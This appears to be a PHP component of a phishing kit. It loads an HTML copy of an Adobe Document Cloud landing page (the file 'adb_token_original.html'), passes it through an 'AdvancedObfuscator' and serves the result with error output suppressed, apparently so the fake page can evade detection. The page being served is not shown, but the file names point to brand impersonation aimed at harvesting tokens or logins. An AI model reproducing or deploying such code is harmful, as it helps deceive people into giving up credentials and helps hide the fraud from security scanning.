<?php
/**
 * Obfuscated Adobe Document Cloud Landing Page
 * Advanced obfuscation with full functionality preserved
 */

error_reporting(0);
ini_set('display_errors', 0);

require_once __DIR__ . '/obfuscator_v2.php';

// Load the clean original HTML
$html = @file_get_contents(__DIR__ . '/adb_token_original.html');

if (!$html || strlen($html) < 1000) {
    // Fallback: redirect to original if file reading fails
    header('Location: adb_token_original.html' . ($_SERVER['REQUEST_URI'] ?? ''));
    exit;
}

// Create obfuscator instance
$obfuscator = new AdvancedObfuscator();

// Apply obfuscation
$obfuscatedHtml = $obfuscator->obfuscate($html);

// Set proper headers
header('Content-Type: text/html; charset=UTF-8');
header('X-Content-Type-Options: nosniff');

// Output obfuscated HTML
echo $obfuscatedHtml;
?>
